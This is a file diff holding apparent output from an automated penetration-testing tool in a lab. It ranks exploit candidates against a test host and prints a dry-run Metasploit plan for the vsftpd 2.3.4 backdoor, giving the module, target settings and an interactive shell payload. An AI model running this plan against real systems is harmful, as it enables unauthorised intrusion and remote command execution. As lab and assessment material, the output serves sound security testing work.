@@ -1,0 +1,38 @@
+========================================
+        METASPLOIT EXPLOITATION
+          (authorized lab only)
+========================================
+
+[*] Target:   203.0.113.75
+[*] Findings: /home/kali/security-assessment/tests/runs/20260923_100154/t75/src
+
+Available exploit candidates:
+----------------------------------------
+[1] 21   high   vsftpd 2.3.4  [high/high]  EDB-17491 (EXACT_VERSION_MATCH)
+      vsftpd 2.3.4 - Backdoor Command Execution
+[2] 139  medium Samba smbd 3.0.20-Debian  [medium/medium]  EDB-16320 (VERSION_RANGE_MATCH)
+      Samba 3.0.20 < 3.0.25rc3 - Username map script Command Execution
+[3] 8009 medium Apache Jserv 1.2  [medium/medium]  EDB-30004 (STRONG_PRODUCT_SERVICE_MATCH)
+      Apache Jserv Remote Buffer Overflow
+----------------------------------------
+[*] Candidate index given: selecting candidate 1.
+
+[+] Selected: vsftpd 2.3.4 - Backdoor Command Execution (vsftpd 2.3.4, port 21)
+    Service: ftp | Confidence: high | Match: EXACT_VERSION_MATCH | EDB-17491
+
+[*] Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor
+[*] Payload:          cmd/unix/interact
+[*] Mapping note:     vsftpd 2.3.4 backdoor (classic MS2 lab)
+
+
+[*] DRY-RUN - nothing was executed and no artifacts were written.
+    Plan (capabilities are validated against the Metasploit build at run time):
+    use exploit/unix/ftp/vsftpd_234_backdoor
+    set RHOSTS 203.0.113.75
+    set RPORT 21
+    set PAYLOAD cmd/unix/interact
+    set LHOST <attacker-side listener>   (only if the effective payload requires it)
+    set ExitOnSession false              (only if the build supports it)
+    exploit -j -z   (bounded to 120s)
+    evidence        (only after a real session is detected)
+
